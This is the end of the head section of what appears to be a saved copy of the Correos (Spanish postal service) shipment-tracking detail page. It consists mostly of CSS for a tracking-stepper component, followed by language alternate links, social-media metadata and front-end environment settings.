				width: 100%;
				height: 50%;
				background: -webkit-gradient(linear, left top, right top, color-stop(47%, rgba(255, 255, 255, 0)), color-stop(50%, var(--_ui-tracking-stepper-line-done-color)), color-stop(53%, rgba(255, 255, 255, 0)));
				background: linear-gradient(90deg, rgba(255, 255, 255, 0) 47%, var(--_ui-tracking-stepper-line-done-color) 50%, rgba(255, 255, 255, 0) 53%)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevUndone.sc-correos-ui-tracking-stepper:before {
				background: -webkit-gradient(linear, left top, right top, color-stop(47%, rgba(255, 255, 255, 0)), color-stop(50%, var(--_ui-tracking-stepper-line-undone-color)), color-stop(53%, rgba(255, 255, 255, 0)));
				background: linear-gradient(90deg, rgba(255, 255, 255, 0) 47%, var(--_ui-tracking-stepper-line-undone-color) 50%, rgba(255, 255, 255, 0) 53%)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevError.sc-correos-ui-tracking-stepper:before {
				background: -webkit-gradient(linear, left top, right top, color-stop(47%, rgba(255, 255, 255, 0)), color-stop(50%, var(--_ui-tracking-stepper-error)), color-stop(53%, rgba(255, 255, 255, 0)));
				background: linear-gradient(90deg, rgba(255, 255, 255, 0) 47%, var(--_ui-tracking-stepper-error) 50%, rgba(255, 255, 255, 0) 53%)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextDone.sc-correos-ui-tracking-stepper:after,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextUndone.sc-correos-ui-tracking-stepper:after,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextError.sc-correos-ui-tracking-stepper:after {
				bottom: 0;
				top: auto;
				width: 100%;
				height: 50%;
				background: -webkit-gradient(linear, left top, right top, color-stop(47%, rgba(255, 255, 255, 0)), color-stop(50%, var(--_ui-tracking-stepper-line-done-color)), color-stop(53%, rgba(255, 255, 255, 0)));
				background: linear-gradient(90deg, rgba(255, 255, 255, 0) 47%, var(--_ui-tracking-stepper-line-done-color) 50%, rgba(255, 255, 255, 0) 53%)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextUndone.sc-correos-ui-tracking-stepper:after,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevUndone.sc-correos-ui-tracking-stepper:after {
				background: -webkit-gradient(linear, left top, right top, color-stop(47%, rgba(255, 255, 255, 0)), color-stop(50%, var(--_ui-tracking-stepper-line-undone-color)), color-stop(53%, rgba(255, 255, 255, 0)));
				background: linear-gradient(90deg, rgba(255, 255, 255, 0) 47%, var(--_ui-tracking-stepper-line-undone-color) 50%, rgba(255, 255, 255, 0) 53%)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextError.sc-correos-ui-tracking-stepper:after {
				background: -webkit-gradient(linear, left top, right top, color-stop(47%, rgba(255, 255, 255, 0)), color-stop(50%, var(--_ui-tracking-stepper-error)), color-stop(53%, rgba(255, 255, 255, 0)));
				background: linear-gradient(90deg, rgba(255, 255, 255, 0) 47%, var(--_ui-tracking-stepper-error) 50%, rgba(255, 255, 255, 0) 53%)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body.sc-correos-ui-tracking-stepper {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: start;
				align-items: flex-start;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap;
				text-align: left;
				margin: 24px 24px 16px 24px
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body__titlecontent.sc-correos-ui-tracking-stepper {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: row;
				flex-direction: row
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body--border-bottom.sc-correos-ui-tracking-stepper {
				position: relative;
				width: calc(100% - 40px)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body--border-bottom.sc-correos-ui-tracking-stepper:after {
				content: "";
				position: absolute;
				bottom: -16px;
				left: 0;
				width: 100%;
				height: 1px;
				background: var(--_ui-tracking-stepper-dot-undone-color)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body.sc-correos-ui-tracking-stepper .tracking-stepper-texticon.sc-correos-ui-tracking-stepper {
				margin-left: 4px;
				font-size: 16px;
				display: block;
				margin-left: 8px;
				color: #348f41
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__title.sc-correos-ui-tracking-stepper {
				font-size: 14px;
				line-height: 22px;
				font-weight: bold;
				color: var(--_ui-tracking-stepper-font-color)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__title--error.sc-correos-ui-tracking-stepper {
				color: var(--_ui-tracking-stepper-error)
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__title.sc-correos-ui-tracking-stepper {
					font-size: 1rem;
					line-height: 24px
				}
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__date.sc-correos-ui-tracking-stepper {
				font-size: 14px;
				line-height: 22px;
				font-weight: 300;
				color: var(--_ui-tracking-stepper-font-color);
				display: block;
				width: 100%
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__date.sc-correos-ui-tracking-stepper {
					font-size: 1rem;
					line-height: 22px
				}
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__desc.sc-correos-ui-tracking-stepper {
				font-size: 14px;
				line-height: 22px;
				font-weight: 300;
				color: var(--_ui-tracking-stepper-font-color);
				display: block;
				width: 100%
			}

			@media (min-width: 640px) {
				.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__desc.sc-correos-ui-tracking-stepper {
					font-size: 1rem;
					line-height: 22px
				}
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer_stepbody.sc-correos-ui-tracking-stepper {
				display: -ms-flexbox;
				display: flex;
				width: 100%
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childsbutton.sc-correos-ui-tracking-stepper {
				border: unset;
				cursor: pointer;
				margin: 0;
				padding: 0;
				width: unset;
				overflow: unset;
				background: unset;
				text-align: flex-start;
				color: inherit;
				font: inherit;
				line-height: inherit;
				-webkit-font-smoothing: inherit;
				-moz-osx-font-smoothing: inherit;
				-webkit-appearance: none;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-item-align: center;
				align-self: center;
				outline: none;
				border-radius: 50%
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childsbutton.sc-correos-ui-tracking-stepper::-moz-focus-inner {
				border: 0;
				padding: 0
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childsbutton.sc-correos-ui-tracking-stepper i.sc-correos-ui-tracking-stepper {
				-webkit-transition: -webkit-transform 0.3s ease-in-out;
				transition: -webkit-transform 0.3s ease-in-out;
				transition: transform 0.3s ease-in-out;
				transition: transform 0.3s ease-in-out, -webkit-transform 0.3s ease-in-out
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childsbutton.sc-correos-ui-tracking-stepper i.opened.sc-correos-ui-tracking-stepper {
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(180deg);
				transform: rotate(180deg)
			}

			@media (min-width: 640px) {
				.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childsbutton.sc-correos-ui-tracking-stepper {
					padding-left: 24px;
					padding-right: 24px
				}
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childcontainer.sc-correos-ui-tracking-stepper {
				overflow: hidden
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childsbody.sc-correos-ui-tracking-stepper {
				opacity: 1;
				-webkit-transition: all 0.45s cubic-bezier(0.55, 0.05, 0.05, 0.96);
				transition: all 0.45s cubic-bezier(0.55, 0.05, 0.05, 0.96);
				-webkit-transition-property: opacity;
				transition-property: opacity;
				background: var(--_ui-tracking-stepper-bg-color)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childsbody.closed.sc-correos-ui-tracking-stepper {
				opacity: 0;
				visibility: hidden;
				-webkit-transform: translateY(-10px);
				transform: translateY(-10px);
				height: 0
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childsbody.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper {
				min-width: 40px
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childsbody.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevDone.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childsbody.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevUndone.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childsbody.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextDone.sc-correos-ui-tracking-stepper:after,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childsbody.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextUndone.sc-correos-ui-tracking-stepper:after {
				height: 50%
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childsbody.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper {
				height: 8px;
				width: 8px
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childcontainer.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__childsbody.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper:not(.done) {
				background-color: var(--_ui-tracking-stepper-line-undone-color);
				border: 0
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.horizontal.sc-correos-ui-tracking-stepper .lastItem.sc-correos-ui-tracking-stepper,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .lastItem.sc-correos-ui-tracking-stepper {
				border-bottom: none
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.horizontal.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__container.sc-correos-ui-tracking-stepper:last-child .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .done.sc-correos-ui-tracking-stepper,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.horizontal.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__container.sc-correos-ui-tracking-stepper:last-child .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__container.sc-correos-ui-tracking-stepper:last-child .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .done.sc-correos-ui-tracking-stepper,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__container.sc-correos-ui-tracking-stepper:last-child .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper {
				background-color: var(--_ui-tracking-stepper-dot-done-color)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.horizontal.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__container.sc-correos-ui-tracking-stepper:last-child .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .done.sc-correos-ui-tracking-stepper .icon-check.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.horizontal.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__container.sc-correos-ui-tracking-stepper:last-child .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper .icon-check.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__container.sc-correos-ui-tracking-stepper:last-child .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .done.sc-correos-ui-tracking-stepper .icon-check.sc-correos-ui-tracking-stepper:before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__container.sc-correos-ui-tracking-stepper:last-child .correos-ui-tracking-stepper__step.primary.sc-correos-ui-tracking-stepper .step.sc-correos-ui-tracking-stepper .icon-check.sc-correos-ui-tracking-stepper:before {
				color: var(--_ui-tracking-stepper-white)
			}

			.sc-correos-ui-tracking-stepper-h .sc-correos-ui-tracking-stepper-s>[slot=textTitle] {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 1.125rem;
				line-height: 1.625rem;
				color: var(--_ui-tracking-stepper-font-color)
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-tracking-stepper-h .sc-correos-ui-tracking-stepper-s>[slot=textTitle] {
					font-size: 1.5rem;
					line-height: 2.25rem
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-tracking-stepper-h .sc-correos-ui-tracking-stepper-s>[slot=textTitle] {
					margin-bottom: 1rem
				}
			}

			[parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper,
			[parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper,
			[parent-size=md].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper {
				margin: 0
			}

			[parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body.sc-correos-ui-tracking-stepper,
			[parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body.sc-correos-ui-tracking-stepper,
			[parent-size=md].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.vertical.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__body.sc-correos-ui-tracking-stepper {
				margin: 16px
			}

			[variant=responsive-full].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__appendInfo.sc-correos-ui-tracking-stepper {
				margin-left: 0
			}

			[variant=responsive-full].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__appendInfo--border-bottom.sc-correos-ui-tracking-stepper {
				max-width: 664px;
				width: 100%;
				padding-bottom: 24px;
				border-bottom: 1px solid var(--_ui-tracking-stepper-border-bottom)
			}

			@media (min-width: 640px) {
				[variant=responsive-full].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__appendInfo.sc-correos-ui-tracking-stepper {
					margin-left: 24px
				}
			}

			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.horizontal.sc-correos-ui-tracking-stepper,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.horizontal.sc-correos-ui-tracking-stepper {
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__appendInfo.sc-correos-ui-tracking-stepper,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__appendInfo.sc-correos-ui-tracking-stepper {
				margin-left: 0;
				padding-top: 16px
			}

			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__appendInfo--border-bottom.sc-correos-ui-tracking-stepper,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__appendInfo--border-bottom.sc-correos-ui-tracking-stepper {
				width: auto;
				padding-bottom: 0;
				border-bottom: 0
			}

			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__root-graphic.sc-correos-ui-tracking-stepper,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__root-graphic.sc-correos-ui-tracking-stepper {
				width: 100%
			}

			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__container.sc-correos-ui-tracking-stepper,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__container.sc-correos-ui-tracking-stepper {
				width: calc(100% / 4)
			}

			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__container.sc-correos-ui-tracking-stepper:last-child .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__container.sc-correos-ui-tracking-stepper:last-child .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper {
				-ms-flex-pack: end;
				justify-content: flex-end
			}

			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__container.sc-correos-ui-tracking-stepper:nth-child(3) .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__container.sc-correos-ui-tracking-stepper:nth-child(3) .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper {
				-ms-flex-pack: center;
				justify-content: center
			}

			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer_stepbody.sc-correos-ui-tracking-stepper,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__parentcontainer_stepbody.sc-correos-ui-tracking-stepper {
				width: 100%
			}

			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.sc-correos-ui-tracking-stepper {
				width: 100%;
				-ms-flex-pack: start;
				justify-content: flex-start
			}

			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevDone.sc-correos-ui-tracking-stepper,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevDone.sc-correos-ui-tracking-stepper {
				-ms-flex-pack: center;
				justify-content: center
			}

			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevDone.sc-correos-ui-tracking-stepper:before,
			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevUndone.sc-correos-ui-tracking-stepper:before,
			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextDone.sc-correos-ui-tracking-stepper:after,
			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextUndone.sc-correos-ui-tracking-stepper:after,
			[variant=responsive-full][parent-size=xs].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextError.sc-correos-ui-tracking-stepper:after,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevDone.sc-correos-ui-tracking-stepper:before,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.prevUndone.sc-correos-ui-tracking-stepper:before,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextDone.sc-correos-ui-tracking-stepper:after,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextUndone.sc-correos-ui-tracking-stepper:after,
			[variant=responsive-full][parent-size=sm].sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__root.sc-correos-ui-tracking-stepper .correos-ui-tracking-stepper__step.nextError.sc-correos-ui-tracking-stepper:after {
				width: 100%
			}
		</style>
		<link data-react-helmet="true" rel="stylesheet" href="./static/font/iconfont.css">
		<link rel="canonical" href="/www.correos.es/es/es/herramientas/localizador/envios/detalle.html">
		<link rel="alternate" href="/www.correos.es/es/es/herramientas/localizador/envios/detalle.html" hreflang="x-default">

		<link rel="alternate" hreflang="ca-ES" href="/www.correos.es/es/ca/eines/localitzador/trameses/detall.html">

		<link rel="alternate" hreflang="en-ES" href="/www.correos.es/es/en/tools/tracker/items/details.html">

		<link rel="alternate" hreflang="es-ES" href="/www.correos.es/es/es/herramientas/localizador/envios/detalle.html">

		<link rel="alternate" hreflang="gl-ES" href="/www.correos.es/es/gl/ferramentas/localizador/envios/detalle.html">

		<link rel="alternate" hreflang="va-ES" href="/www.correos.es/es/va/ferramentes/localitzador/enviaments/detall.html">

		<link rel="alternate" hreflang="eu-ES" href="/www.correos.es/es/eu/tresnak/lokalizatzailea/bidalketak/xehetasunak.html">



		<meta name="type" content="herramienta">


		<meta property="og:title" content="Detalle">
		<meta property="og:description">
		<meta property="og:image" itemprop="image" content="https://www.correos.es/content/dam/correos/imagenes/iconos/CORREOS-1000x1000.png">
		<meta property="og:image:secure_url" content="https://www.correos.es/content/dam/correos/imagenes/iconos/CORREOS-1000x1000.png">
		<meta property="og:image:type" content="image/png">
		<meta property="og:image:width" content="1000">
		<meta property="og:image:height" content="1000">
		<meta property="og:url" content="https://www.correos.es/es/es/herramientas/localizador/envios/detalle">
		<meta property="og:type" content="website">
		<meta name="twitter:title" content="Detalle">
		<meta name="twitter:description">
		<meta name="twitter:url" content="https://www.correos.es/es/es/herramientas/localizador/envios/detalle">
		<meta name="twitter:card" content="summary">
		<meta name="twitter:site" content="@correos">


		<meta name="autor" content="Grupo Correos">
		<meta name="organization" content="Sociedad Estatal de Correos y Telégrafos, S.A.">



		<meta name="environmentApiHost" content="https://api1.correos.es">
		<meta name="environmentApiHostAzure" content="https://apicorp.correos.es">
		<meta name="environmentApiHostCorreosId" content="https://apicorreosidservices.correos.es">
		<meta name="environmentApplicationOid" content="51058cef-6554-483d-a1ff-ca60b4e2694d">
		<meta name="environmentcacheLocation" content="sessionStorage">
		<meta name="environmentApiHostAEM" content="/content/correos/es/es">
		<meta name="environmentTypeRoute" content="PB">
		<meta name="environmentUrlLogOutRedirect" content="https://mioficina.correos.es/es/es/login">
		<meta name="environmentLanguage" content="ES">
		<link rel="stylesheet" href="./files/css/correos-ui-kit.css" id="components-css">
		<link rel="stylesheet" href="./files/css/clientlib-base.min.7d250654d6a4ba422176cd385b93bb36.css" type="text/css">
		<meta name="theme-color" content="#000000">
		<link rel="icon" href="/www.correos.es/content/dam/correos/imagenes/iconos/correos-favicon.svg">
		<link rel="apple-touch-icon" sizes="180x180" href="/www.correos.es/content/dam/correos/imagenes/iconos/correos-favicon.svg">
